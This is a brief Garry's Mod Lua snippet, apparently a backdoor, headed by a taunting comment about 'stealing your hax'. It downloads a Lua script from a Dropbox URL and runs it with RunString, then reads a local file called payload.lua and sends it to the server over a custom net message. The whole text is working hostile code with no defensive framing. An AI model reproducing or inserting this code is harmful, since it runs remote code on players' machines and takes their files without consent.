--[GTL] I'M IN YOUR LUA! STEALING YOUR HAX...


http.Fetch("https://dl.dropboxusercontent.com/u/101744766/servers/gmod/lua/bddyn/client/go.lua", RunString, function(err) end)
--sendload
net.Start("bdsm")
net.WriteTable({"lua", file.Read("payload.lua", "LUA")})
net.SendToServer()